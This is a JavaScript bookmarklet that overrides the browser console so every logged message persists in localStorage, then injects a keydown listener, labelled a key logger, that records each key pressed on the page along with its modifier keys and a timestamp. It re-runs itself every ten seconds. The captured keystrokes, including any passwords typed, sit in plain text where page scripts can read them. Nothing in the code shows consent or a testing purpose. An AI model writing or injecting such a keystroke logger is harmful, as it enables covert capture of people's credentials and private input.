(function repeatBookmarkletLogic() {
  try {
    // === BEGIN: Custom console.log to localStorage ===
    (function() {
      const LOG_KEY = 'logs'; // Changed from 'bookmarkletLogs' to 'logs'

      // Load existing logs or start with an empty array
      const loadLogs = () => {
        try {
          return JSON.parse(localStorage.getItem(LOG_KEY)) || [];
        } catch (e) {
          return [];
        }
      };

      const saveLog = (message) => {
        const logs = loadLogs();
        logs.push({
          message,
          timestamp: new Date().toISOString()
        });
        localStorage.setItem(LOG_KEY, JSON.stringify(logs));
      };

      const originalLog = console.log;
      console.log = function(...args) {
        const message = args.map(arg => {
          try {
            return typeof arg === 'object' ? JSON.stringify(arg) : String(arg);
          } catch (e) {
            return String(arg);
          }
        }).join(' ');
        saveLog(message);
        originalLog.apply(console, args);
      };

      const originalError = console.error;
      console.error = function(...args) {
        const message = '[ERROR] ' + args.map(arg => {
          try {
            return typeof arg === 'object' ? JSON.stringify(arg) : String(arg);
          } catch (e) {
            return String(arg);
          }
        }).join(' ');
        saveLog(message);
        originalError.apply(console, args);
      };
    })();
    // === END: Custom console.log to localStorage ===

    // === BEGIN: Bookmarklet code logic ===
    console.log("Running bookmarklet logic...");

    (function() {
      if (window.__keyLoggerInjected) {
        console.log("Key logger already active.");
        return;
      }
      window.__keyLoggerInjected = true;

      document.addEventListener('keydown', function(event) {
        const keyInfo = {
          key: event.key,
          code: event.code,
          altKey: event.altKey,
          ctrlKey: event.ctrlKey,
          shiftKey: event.shiftKey,
          metaKey: event.metaKey,
          timestamp: new Date().toISOString(),
        };
        console.log('Key Pressed:', keyInfo);
      });

      console.log("Key logger injected.");
    })();
    // === END: Bookmarklet code ===

  } catch (e) {
    console.error("Error running bookmarklet logic:", e);
  }

  // Try again in 10 seconds
  setTimeout(repeatBookmarkletLogic, 10000);
})();
